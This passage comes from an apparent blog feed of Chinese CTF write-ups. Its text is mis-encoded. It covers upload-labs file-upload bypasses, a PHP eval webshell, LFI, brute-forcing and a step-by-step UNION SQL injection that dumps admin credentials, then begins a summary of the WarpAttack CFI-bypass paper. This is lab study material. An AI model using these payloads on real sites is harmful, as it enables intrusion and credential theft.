ï¼Œæ‰€ä»¥è¿›è¡Œæˆªæ–­éœ€è¦æ‰‹åŠ¨ä¿®æ”¹äºŒè¿›åˆ¶æµ</p><h4 id="Pass-13ï¼Œ14ï¼Œ15"><a href="#Pass-13ï¼Œ14ï¼Œ15" class="headerlink" title="Pass-13ï¼Œ14ï¼Œ15"></a>Pass-13ï¼Œ14ï¼Œ15</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907151043164.png" alt="image-20230907151043164"></p><p>åˆ›å»ºå›¾ç‰‡é©¬ï¼š</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150642263.png" alt="image-20230907150642263"></p><p>æŠ“åŒ…è®°å½•ä¸Šä¼ ä½ç½®</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150615706.png" alt="image-20230907150615706"></p><p>é€šè¿‡é¢˜ç›®ç»™å‡ºçš„æ–‡ä»¶åŒ…å«æ¼æ´è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°æ­£ç¡®è¿”å›äº†æœ¨é©¬ä¸­çš„phpinfo()å†…å®¹</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150559242.png" alt="image-20230907150559242"></p><h4 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907153602463.png" alt="image-20230907153602463"></p><p>å‘ç°ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ï¼Œåˆ™ä¹‹å‰ä½¿ç”¨çš„å›¾ç‰‡ç æ— æ³•ä½¿ç”¨ï¼Œå› ä¸ºåŠ åœ¨å›¾ç‰‡åçš„phpä»£ç ä¼šè¢«æ¸²æŸ“ï¼Œä»è€Œæ— æ³•æ­£ç¡®æ‰§è¡Œ</p><p>æ‰€ä»¥å¯ä»¥ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œå¯¹æ¯”çœ‹è¢«äºŒæ¬¡æ¸²æŸ“è¿‡çš„å›¾ç‰‡æœ‰ä»€ä¹ˆåœ°æ–¹æ˜¯æ²¡å˜çš„ï¼Œå¯ä»¥å°†phpä»£ç æ’å…¥å…¶ä¸­ï¼ˆé€šå¸¸æ–‡ä»¶å¤´æ˜¯ä¸ä¼šè¢«ä¿®æ”¹çš„ï¼Œä½†ä¿®æ”¹æ–‡ä»¶å¤´å¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶æŸåï¼‰</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163747679.png" alt="image-20230907163747679"></p><p>å·¦è¾¹æ˜¯ä¿®æ”¹è¿‡çš„gifï¼Œå³è¾¹æ˜¯ä¸Šä¼ ä¹‹åé‡æ–°ä¸‹è½½çš„gifï¼Œå¯ä»¥çœ‹åˆ°phpä»£ç è¢«æˆåŠŸçš„æ·»åŠ </p><p>ç”¨ä¸Šä¸€é¢˜åŒæ ·çš„æ–¹æ³•è®¿é—®</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163902487.png" alt="image-20230907163902487"></p><p>é€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä»£ç è¢«æˆåŠŸæ‰§è¡Œ</p><h4 id="Pass-17ï¼Œ18æ¡ä»¶ç«äº‰"><a href="#Pass-17ï¼Œ18æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-17ï¼Œ18æ¡ä»¶ç«äº‰"></a>Pass-17ï¼Œ18æ¡ä»¶ç«äº‰</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907165625505.png" alt="image-20230907165625505"></p><p>åˆ©ç”¨æ—¶é—´å·®ï¼Œæ ¹æ®æºç å¯ä»¥çŸ¥é“ï¼Œä¸Šä¼ çš„é€»è¾‘æ˜¯ï¼šå¦‚æœä¸Šä¼ ä¸€ä¸ªjpgï¼Œpngï¼Œgifå›¾ç‰‡ï¼ŒæˆåŠŸäº†åˆ™æ”¹åå¹¶ä¿å­˜ï¼Œè‹¥æ²¡æˆåŠŸåˆ™åˆ é™¤ï¼Œåˆ™å¯ä»¥é€šè¿‡burpsuiteè¿›è¡Œæ”»å‡»ï¼Œä¸æ–­çš„ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶ä¸æ–­çš„è®¿é—®è¯¥æ–‡ä»¶ï¼Œç›´åˆ°è®¿é—®æˆåŠŸ</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs1</title>
    <link href="/2023/09/05/Upload-labs/"/>
    <url>/2023/09/05/Upload-labs/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p><img src="/2023/09/05/Upload-labs/image-20230905105954741.png" alt="image-20230905105954741"></p><p><strong>åˆ›å»ºä¸€å¥è¯php</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110036360.png" alt="image-20230905110036360"></p><ul><li><code>@</code>ï¼šé”™è¯¯æŠ‘åˆ¶ç¬¦å·ï¼Œå¯ä»¥é˜»æ­¢PHPæŠ¥å‘Ševalå‡½æ•°æ‰§è¡Œä¸­çš„é”™è¯¯</li><li><code>eval</code>ï¼šæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå°†å…¶ä½œä¸ºPHPä»£ç æ‰§è¡Œ</li><li><code>$_POST(&#39;shell&#39;)</code>ï¼šPOSTè¯·æ±‚å˜é‡ï¼ŒåŒ…å«ä¸€ä¸ªåä¸ºshellçš„å‚æ•°</li></ul><p><strong>ä¸Šä¼ å°è¯•</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110908269.png" alt="image-20230905110908269"></p><p>çŒœæµ‹æ˜¯å‰ç«¯JSé™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ï¼Œç›´æ¥ç¦ç”¨å‰ç«¯JSåï¼Œå†æ¬¡ä¸Šä¼ </p><p><img src="/2023/09/05/Upload-labs/image-20230905111208945.png" alt="image-20230905111208945"></p><p>ä¸Šä¼ æˆåŠŸï¼ŒæŸ¥çœ‹ä¼ è¾“çš„è·¯å¾„</p><p><img src="/2023/09/05/Upload-labs/image-20230905111248987.png" alt="image-20230905111248987"></p><p>é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥</p><p><img src="/2023/09/05/Upload-labs/image-20230905111418459.png" alt="image-20230905111418459"></p><p>åœ¨æ ¹ç›®å½•ä¸‹å³å¯æ‰¾åˆ°flag</p><h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><p>ä¾ç„¶é€šè¿‡ä¸€å¥è¯phpæœ¨é©¬è¿›è¡Œå°è¯•</p><p><img src="/2023/09/05/Upload-labs/image-20230905111610103.png" alt="image-20230905111610103"></p><p>é€šè¿‡Burpsuiteè¿›è¡ŒæŠ“åŒ…</p><p><img src="/2023/09/05/Upload-labs/image-20230905111716152.png" alt="image-20230905111716152"></p><p>Content-Typeæ˜¾ç¤ºä¸ºtext&#x2F;phpï¼Œä¿®æ”¹ä¸ºimage&#x2F;jpegï¼Œé‡å‘</p><p><img src="/2023/09/05/Upload-labs/image-20230905113245564.png" alt="image-20230905113245564"></p><p>å¾—åˆ°è·¯å¾„ï¼Œå…¶ä½™æ“ä½œä¸Pass-01ç›¸åŒ</p><p>åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®å‡½æ•°ï¼š<code>mime_content_type()</code></p><h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><p><img src="/2023/09/05/Upload-labs/image-20230905133923792.png" alt="image-20230905133923792"></p><p>åŸºäºé»‘åå•ç»•è¿‡ï¼Œé€šå¸¸æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>ä¸Šä¼ ä¸å¸¸è§çš„phpæ‹“å±•åï¼špht, phpt, phtml, php3,php4,php5,php6</li><li>æœ‰äº›ä¼šå¿½ç•¥å¤§å°å†™ï¼šPhpï¼ŒPHpï¼ŒpHpä¹‹ç±»çš„</li><li>è§£ææ¼æ´ï¼šä¾‹å¦‚apacheï¼Œiisï¼Œnginxï¼ˆéœ€è¦ç»§ç»­äº†è§£ï¼Œåç»­å•ç‹¬å†™åšå®¢ï¼‰</li></ul><p><img src="/2023/09/05/Upload-labs/image-20230905134828992.png" alt="image-20230905134828992"></p><p>ä¿®æ”¹åç¼€å³å¯</p><h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><p><img src="/2023/09/05/Upload-labs/image-20230906131705456.png" alt="image-20230906131705456"></p><p>å±è”½äº†æ‰€æœ‰çš„æ‹“å±•åï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡åŸºäºç™½åå•çš„ç»•è¿‡è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼š%00æˆªæ–­ï¼šåœ¨urlä¸­%00è¡¨ç¤ºascllç ä¸­çš„0 ï¼Œè€Œasciiä¸­0ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸï¼Œæ‰€ä»¥å½“urlä¸­å‡ºç°%00æ—¶å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸ</p><p><img src="/2023/09/05/Upload-labs/image-20230906131758825.png" alt="image-20230906131758825"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šä¼ .htaccessæ–‡ä»¶ç»•è¿‡</p><h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><p><img src="/2023/09/05/Upload-labs/image-20230906135624141.png" alt="image-20230906135624141"></p><p>å¯¹æ¯”ä¹‹å‰çš„é¢˜ç›®ï¼Œå¯ä»¥å‘ç°ï¼Œå°‘äº†å°†æ–‡ä»¶åå…¨éƒ¨è½¬åŒ–æˆå°å†™è¿™ä¸€æ­¥ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¤§å°å†™æ··åˆè¿›è¡Œç»•è¿‡</p><p><img src="/2023/09/05/Upload-labs/image-20230906140256010.png" alt="image-20230906140256010"></p><h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><p><img src="/2023/09/05/Upload-labs/image-20230906142332590.png" alt="image-20230906142332590"></p><p>å¹¶æœªå»é™¤é¦–å°¾çš„ç©ºæ ¼ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ ç©ºæ ¼çš„æ–¹å¼ç»•è¿‡</p><p><img src="/2023/09/05/Upload-labs/image-20230906143052256.png" alt="image-20230906143052256"></p><p>å› ä¸ºæ­¤æ—¶æœåŠ¡å™¨è·å¾—çš„æ–‡ä»¶åç¼€æ˜¯php+ç©ºæ ¼ï¼Œä¸åœ¨é»‘æ˜å•ä¸­ï¼Œæ‰€ä»¥å¯ä»¥å®ç°ç»•è¿‡</p><h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p><img src="/2023/09/05/Upload-labs/image-20230906143845354.png" alt="image-20230906143845354"></p><p>ä»£ç ä¸­æ²¡æœ‰è¿‡æ»¤ç‚¹ï¼Œå¯ä»¥é€šè¿‡åŠ ç‚¹è¿›è¡Œç»•è¿‡</p><p><img src="/2023/09/05/Upload-labs/image-20230906144030007.png" alt="image-20230906144030007"></p><p>æ­¤æ—¶ï¼ŒæœåŠ¡å™¨è·å–åˆ°çš„åç¼€æ˜¯ç©ºï¼Œä¸åœ¨é»‘åå•ä¸­</p><h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p><img src="/2023/09/05/Upload-labs/image-20230906150046786.png" alt="image-20230906150046786"></p><p>æºç æ²¡æœ‰è¿‡æ»¤::DATAï¼Œå¯ä»¥åˆ©ç”¨windowsçš„ç‰¹æ€§</p><p>åœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+<code>&quot;::$DATA&quot;</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ<code>::$DATA</code>ä¹‹å‰çš„æ–‡ä»¶åï¼Œç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p><p><img src="/2023/09/05/Upload-labs/image-20230906150026942.png" alt="image-20230906150026942"></p><h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153208872.png" alt="image-20230906153208872"></p><p>ç”±äºä»£ç æ²¡æœ‰å†™å¾ªç¯ï¼Œä»£è¡¨å¯¹äº <code>.</code> å’Œ <code> space</code>çš„è¿‡æ»¤åªä¼šè¿›è¡Œä¸€éï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡åœ¨åç¼€ååæ·»åŠ  <code>. .</code>æ¥è¿›è¡Œç»•è¿‡</p><h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153917267.png" alt="image-20230906153917267"></p><p><code>$file_name=str_ireplace($deny_file, &quot;&quot;, $file_name)</code>ï¼šå‡½æ•°è°ƒç”¨ä¼šæŸ¥æ‰¾ <code>$file_name</code> ä¸­åŒ…å«åœ¨ <code>$deny_ext</code> æ•°ç»„ä¸­çš„ä»»ä½•å­å­—ç¬¦ä¸²ï¼Œç„¶åå°†å®ƒä»¬æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå³åˆ é™¤è¿™äº›å­å­—ç¬¦ä¸²</p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡åŒå†™è¿›è¡Œç»•è¿‡ï¼Œåœ¨å¤„ç† <code>pphphp</code>æ—¶ï¼Œç”±äºä¸Šè¿°å‡½æ•°ï¼Œä¸­é—´çš„phpå°†è¢«æ›¿æ¢æˆç©ºï¼Œè¯¥åç¼€ä»ç„¶ä¼šè¢«è§£ææˆphp</p><p><img src="/2023/09/05/Upload-labs/image-20230906154338920.png" alt="image-20230906154338920"></p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFWriteUp1</title>
    <link href="/2023/09/02/BUUCTFWriteUp1/"/>
    <url>/2023/09/02/BUUCTFWriteUp1/</url>
    
    <content type="html"><![CDATA[<p><strong>LFI COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" alt="image-20230902093905518"></p><p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ¡ä»¶è¯­å¥ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å­˜åœ¨åä¸º â€˜fileâ€™ çš„ GET å‚æ•°ã€‚å¦‚æœå­˜åœ¨ï¼Œä»£ç å—å†…çš„å†…å®¹å°†è¢«æ‰§è¡Œã€‚</p><p><code>$str = $_GET[&#39;file&#39;];</code>ï¼šå°†åä¸º â€˜fileâ€™ çš„ GET å‚æ•°çš„å€¼å­˜å‚¨åœ¨å˜é‡ <code>$str</code> ä¸­ã€‚</p><p><code>include $_GET[&#39;file&#39;];</code>ï¼šè¿™è¡Œä»£ç å°è¯•åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åç”± GET å‚æ•° â€˜fileâ€™ çš„å€¼æŒ‡å®š</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡GETå‚æ•°æ¥æŒ‡å®šè¦åŒ…å«çš„æ–‡ä»¶ï¼Œincludeå¯èƒ½å­˜åœ¨LFIï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´æ”»å‡»ï¼‰</p><p>å°è¯•?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p><p>?file&#x3D;&#x2F;flagå¯ä»¥ç›´æ¥å¾—åˆ°flag</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" alt="image-20230902094347903"></p><p><strong>BRUTE 1</strong></p><p>è¿›å…¥é¶æœºåä»¥ä¸‹ç•Œé¢ï¼š</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" alt="image-20230902102422665"></p><p>éšæ„å°è¯•ç»„åˆç”¨æˆ·åä¸º123ï¼Œpasswordä¸º123ï¼Œè¿”å›â€œç”¨æˆ·åé”™è¯¯â€</p><p>ç”¨burpsuiteæŠ“åŒ…å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" alt="image-20230902102530889"></p><p>æ ¹æ®é¢˜ç›®æ„æ€Bruteä¸ºé‡è›®çš„ï¼Œæ¨æµ‹ä¸ºæš´åŠ›ç ´è§£ï¼Œåˆ™é€‰æ‹©send to Intruderï¼Œå› ä¸ºè¿”å›ä¸ºâ€œç”¨æˆ·åé”™è¯¯â€è€Œä¸æ˜¯â€œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€ï¼Œåœ¨å°è¯•æ—¶ï¼Œæ¨æµ‹å¯ä»¥å…ˆç¡®å®šç”¨æˆ·åï¼Œå†ç¡®å®šå¯†ç ï¼Œä¸éœ€è¦ä¸¤è¾¹åŒæ—¶çˆ†ç ´</p><p>æ‰€ä»¥æ„é€ ï¼š</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" alt="image-20230902103129156"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" alt="image-20230902103004685"></p><p>ç”¨æˆ·åå­—å…¸å’Œå¯†ç å­—å…¸ä¸ºç½‘ä¸Šä¸‹è½½ï¼Œå¯¼å…¥åé€‰æ‹©Simple listï¼Œå¼€å§‹çˆ†ç ´</p><p>å½“ç”¨æˆ·åä¸ºadminæ—¶ï¼š</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" alt="image-20230902103201354"></p><p>æ‰€ä»¥ä¿®æ”¹payloadï¼š</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" alt="image-20230902103408791"></p><p>å¾—åˆ°æ­£ç¡®çš„å€¼6490</p><p>è‡³æ­¤å¾—åˆ°ç”¨æˆ·åä¸ºadminï¼Œå¯†ç ä¸º6490ï¼Œè¾“å…¥å¯ä»¥å¾—åˆ°flag</p><p><strong>SQL COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" alt="image-20230902150719714"></p><p>éšä¾¿ç‚¹å‡»</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" alt="image-20230902163825700"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" alt="image-20230902163842513"></p><p>çœ‹åˆ°åœ¨è®¿é—®backend&#x2F;content_detail.php?id&#x3D;1å¤„ï¼Œå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ç‚¹ï¼Œæ‰”åˆ°HackBarä¸­å¼€å§‹æµ‹è¯•</p><p>åˆ†åˆ«å°è¯•<code>?id=1 and 1=1</code>å’Œ <code>?id=1 and 1=2</code> å‘ç°ç¬¬ä¸€æ¡æœ‰å›æ˜¾ï¼Œç¬¬äºŒæ¡æ²¡æœ‰ï¼Œåˆ¤æ–­ä¸ºæ•°å­—å‹æ³¨å…¥</p><p>åˆ¤æ–­oræ˜¯å¦è¢«è¿‡æ»¤ï¼š</p><p><code>?id=1 or 1=1</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" alt="image-20230902170242985"></p><p>åˆ¤æ–­åˆ—æ•°ï¼š</p><p><code>?id=1 order by 1</code> æœ‰å›æ˜¾</p><p><code>?id=1 order by 2</code>æœ‰å›æ˜¾</p><p><code>?id=1 order by 3</code>æ— å›æ˜¾</p><p>æ‰€ä»¥è¡¨æœ‰ä¸¤åˆ—</p><p>ç¡®å®šå­—æ®µçš„æ˜¾ç¤ºé¡ºåº</p><p><code>?id=-1 union select 1,2</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" alt="image-20230902170731553"></p><p>çˆ†ç ´æ•°æ®åº“ï¼š</p><p><code>?id=-1 union select database(), database()</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" alt="image-20230902171015321"></p><p>æ ¹æ®è·å¾—çš„æ•°æ®åº“çš„åç§°ï¼Œè·å–æ•°æ®è¡¨çš„ä¿¡æ¯</p><p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" alt="image-20230902171132043"></p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>è¿™éƒ¨åˆ†ä¼šè¿æ¥æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨æ ¼åç§°ï¼Œå¹¶ä»¥é€—å·åˆ†éš”çš„å½¢å¼è¿”å›ã€‚äºæ˜¯å¾—åˆ°äº†è¡¨åä¿¡æ¯admin, contents</p><p>ä½¿ç”¨adminè¡¨ï¼Œè·å–å­—æ®µä¿¡æ¯</p><p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" alt="image-20230902171445924"></p><p>æ­¤å¤„union selectåçš„1ä½œä¸ºå ä½ç¬¦ï¼Œä½¿å¾—ç»“æœå¯ä»¥å¯¹é½ï¼Œæ‹¬å·ä¸­çš„æŸ¥è¯¢è¯­å¥å¯ä»¥è·å¾—newsåº“adminè¡¨ä¸­çš„æ‰€æœ‰åˆ—å</p><p>è·å–username</p><p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" alt="image-20230902171958351"></p><p>è·å–å¯†ç </p><p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" alt="image-20230902172038494"></p><p>æ ¹æ®å¾—åˆ°çš„ä¿¡æ¯å³å¯å¾—åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper2</title>
    <link href="/2023/07/27/ReadPaper2/"/>
    <url>/2023/07/27/ReadPaper2/</url>
    
    <content type="html"><![CDATA[<h2 id="WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-ï¼ˆWarpAttackï¼šé€šè¿‡ç¼–è¯‘å™¨å¼•å…¥çš„åŒé‡è·å–ç»•è¿‡CFIï¼‰"><a href="#WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-ï¼ˆWarpAttackï¼šé€šè¿‡ç¼–è¯‘å™¨å¼•å…¥çš„åŒé‡è·å–ç»•è¿‡CFIï¼‰" class="headerlink" title="WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches ï¼ˆWarpAttackï¼šé€šè¿‡ç¼–è¯‘å™¨å¼•å…¥çš„åŒé‡è·å–ç»•è¿‡CFIï¼‰"></a>WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches ï¼ˆWarpAttackï¼šé€šè¿‡ç¼–è¯‘å™¨å¼•å…¥çš„åŒé‡è·å–ç»•è¿‡CFIï¼‰</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>å¦‚ä»Šå¤šæ•°ç³»ç»Ÿä¸Šè¿è¡Œçš„è½¯ä»¶æ˜¯ç”±C&#x2F;C++ç¼–å†™çš„ï¼Œå®¹æ˜“å‡ºç°å†…å­˜æŸåé”™è¯¯ï¼Œå› æ­¤éœ€è¦å¯¹è¿™äº›ç¨‹åºè¿›è¡Œå½»åº•çš„æµ‹è¯•ä»¥å°½å¯èƒ½çš„æ¶ˆé™¤é”™è¯¯ï¼Œä½†é€šå¸¸æµ‹è¯•æ—¶ä¸å®Œæ•´çš„ï¼Œå› æ­¤ä¼šåœ¨ä»£ç ä¸­æ·»åŠ ç¼“è§£æªæ–½ä»¥å¢åŠ æ”»å‡»çš„éš¾åº¦ï¼Œå¹¿æ³›åº”ç”¨çš„æªæ–½æœ‰ï¼š</p><p>åœ°å€ç©ºé—´å¸ƒå±€éšæœºè¯ï¼ˆASLRï¼‰ï¼šæ“ä½œç³»ç»Ÿåœ¨åŠ è½½è¿›ç¨‹çš„æ—¶å€™ï¼Œä¼šéšæœºåœ°æ”¹å˜å¯æ‰§è¡Œæ–‡ä»¶ã€å…±äº«åº“ã€å †æ ˆå’Œå…¶ä»–å†…å­˜åŒºåŸŸçš„åŸºåœ°å€ï¼Œä½¿å¾—è¿™äº›åŒºåŸŸåœ¨æ¯æ¬¡è¿è¡Œæ—¶éƒ½ä½äºä¸åŒçš„å†…å­˜åœ°å€ä½ç½®ã€‚</p><p>å †æ ˆcanariesï¼ˆStack Canariesï¼‰ï¼šé€šè¿‡åœ¨å‡½æ•°è¿”å›åœ°å€ä¹‹å‰æˆ–ä¹‹åæ’å…¥ä¸€ä¸ªç‰¹æ®Šçš„éšæœºå€¼ï¼ˆç§°ä¸ºå †æ ˆé‡‘ä¸é›€æˆ–å †æ ˆå“¨å…µï¼‰ï¼Œæ¥æ£€æµ‹å †æ ˆç¼“å†²åŒºæº¢å‡ºæ”»å‡»ã€‚åœ¨å‡½æ•°æ‰§è¡Œç»“æŸæ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå †æ ˆé‡‘ä¸é›€çš„å€¼æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼Œå¦‚æœè¢«ä¿®æ”¹ï¼Œå°±è¯´æ˜å‘ç”Ÿäº†å †æ ˆç¼“å†²åŒºæº¢å‡ºæ”»å‡»ã€‚å¦‚æœæ£€æµ‹åˆ°è¿™ç§å¼‚å¸¸æƒ…å†µï¼Œç¨‹åºé€šå¸¸ä¼šç«‹å³ç»ˆæ­¢æ‰§è¡Œï¼Œä»è€Œé˜²æ­¢æ¶æ„ä»£ç å¾—ä»¥æ‰§è¡Œã€‚</p><p>æ•°æ®æ‰§è¡Œé¢„é˜²ï¼ˆDEPï¼‰ï¼šé€šè¿‡ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„æ”¯æŒï¼Œåœ¨å†…å­˜ä¸­æ ‡è®°æŸäº›åŒºåŸŸä¸ºâ€ä¸å¯æ‰§è¡Œâ€ï¼Œä¹Ÿå°±æ˜¯é˜»æ­¢è¿™äº›åŒºåŸŸçš„æ•°æ®ä½œä¸ºæŒ‡ä»¤è¢«æ‰§è¡Œã€‚è¿™æ ·ä¸€æ¥ï¼Œå³ä½¿æ”»å‡»è€…æˆåŠŸæ³¨å…¥æ¶æ„ä»£ç åˆ°å†…å­˜ä¸­ï¼Œä¹Ÿæ— æ³•æ‰§è¡Œï¼Œå› ä¸ºè¿™äº›åŒºåŸŸè¢«æ ‡è®°ä¸ºåªèƒ½åŒ…å«æ•°æ®è€Œä¸èƒ½æ‰§è¡ŒæŒ‡ä»¤ã€‚</p><p>ä»£ç é‡ç”¨æ”»å‡»åœ¨è¿™äº›ç¼“è§£æªæ–½ä¸‹ä»ç„¶æœ‰æ•ˆï¼Œä¾‹å¦‚ROPï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰ï¼Œé’ˆå¯¹è¿™ä¸€ç‚¹ï¼ŒCFIï¼ˆControl-Flow Integrityï¼‰è¢«è®¤ä¸ºæ˜¯é˜»æ­¢ä»£ç é‡ç”¨æ”»å‡»çš„å…³é”®æªæ–½ã€‚CFIé¦–å…ˆé™æ€è®¡ç®—ç¨‹åºçš„æ§åˆ¶æµå›¾ï¼ˆCFGï¼‰ï¼Œå¹¶ç¡®å®šæ‰€æœ‰åˆæ³•çš„æ§åˆ¶æµä¼ è¾“ç›®æ ‡ã€‚ç„¶åï¼ŒCFIä¼šåœ¨ä»£ç ä¸­æ’å…¥æ£€æŸ¥ï¼Œä»¥åœ¨è¿è¡Œæ—¶éªŒè¯æ¯ä¸ªæ§åˆ¶æµä¼ è¾“ã€‚</p><p>ä½†ç›®å‰çš„ç¼–è¯‘å™¨å¯¹äºç¼“è§£æªæ–½æ’å…¥çš„å®‰å…¨æ£€æŸ¥ä»£ç å¹¶ä¸ä¼šè§†ä¸ºç‰¹æƒä»£ç ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œä»£ç ä¼˜åŒ–æ—¶ï¼Œå¯èƒ½å¯¼è‡´å®‰å…¨æ€§é­åˆ°ç ´åä½¿æ”»å‡»è€…æœ‰Time-of-Check to Time-Of-Useï¼ˆTOCTTOUï¼‰çš„æœºä¼š ã€‚</p><p>ä¾‹å¦‚ï¼šä»£ç 